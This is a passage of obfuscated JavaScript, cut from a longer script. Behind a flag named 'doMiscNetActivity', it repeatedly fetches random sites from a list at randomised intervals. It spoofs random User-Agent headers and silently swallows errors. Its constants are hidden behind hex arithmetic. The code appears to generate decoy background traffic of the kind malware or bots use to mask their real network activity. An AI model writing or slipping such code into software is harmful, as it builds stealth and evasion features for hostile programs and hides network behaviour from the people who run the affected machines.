})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0xe8 * 0x21 + -0x96 + 0x39d6) * getRandomInt(-0x2 * -0x3c7 + 0x2036 + -0x27c3, -0xb * -0x28b + -0x20ea + 0xa * 0x7f));
}, -0x13ea + -0x1d37 + 0x3185);